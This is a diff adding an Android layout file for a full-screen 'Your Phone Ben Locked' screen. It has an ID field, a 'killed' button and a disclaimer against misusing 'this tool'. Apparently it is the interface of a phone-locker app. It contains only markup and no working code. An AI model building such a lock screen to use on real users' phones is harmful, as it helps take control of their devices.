@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="utf-8"?>
+<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:background="#000"
+    android:padding="20dp"
+    android:layout_width="match_parent" android:layout_height="match_parent">
+
+    <ImageView
+        android:id="@+id/img"
+        android:layout_width="match_parent"
+        android:layout_height="120dp"
+        android:src="@drawable/vm2"/>
+
+    <TextView
+        android:id="@+id/key"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_marginTop="120dp"
+        android:text="failedGetID"
+        android:textSize="23sp"
+        android:textColor="#01C301"
+        android:layout_centerHorizontal="true"
+        android:textStyle="bold"
+        android:fontFamily="sans-serif-condensed"
+        android:layout_below="@+id/text"/>
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_marginTop="120dp"
+        android:text="ID: "
+        android:layout_alignParentLeft="true"
+        android:textSize="23sp"
+        android:textStyle="bold"
+        android:fontFamily="sans-serif-condensed"
+        android:layout_below="@+id/text"/>
+
+    <Button
+        android:id="@+id/killed"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="killed"
+        android:layout_marginBottom="40dp"
+        android:layout_centerHorizontal="true"
+        android:layout_alignParentBottom="true"
+        android:paddingRight="12dp"
+        android:paddingLeft="12dp"
+        android:textSize="20sp"/>
+
+    <TextView
+        android:id="@+id/text"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:layout_marginTop="20dp"
+        android:text="Your Phone Ben Locked\n------------------------\nPlease do not misuse this tool,\nuse it for learning or creating Licenses applications"
+        android:textSize="23sp"
+        android:textStyle="bold"
+        android:fontFamily="sans-serif-condensed"
+        android:layout_below="@+id/img"/>
+</RelativeLayout>
